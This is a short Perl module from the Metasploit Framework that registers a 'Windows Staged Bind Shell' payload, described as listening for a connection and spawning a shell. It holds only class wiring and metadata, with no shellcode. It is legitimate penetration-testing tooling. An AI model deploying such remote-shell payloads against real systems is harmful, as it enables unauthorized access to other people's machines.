
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::win32_bind_stg;
use strict;
use base 'Msf::PayloadComponent::Win32ShellStage';
sub load {
  Msf::PayloadComponent::Win32ShellStage->import('Msf::PayloadComponent::Win32BindStager');
}

my $info =
{
  'Name'         => 'Windows Staged Bind Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
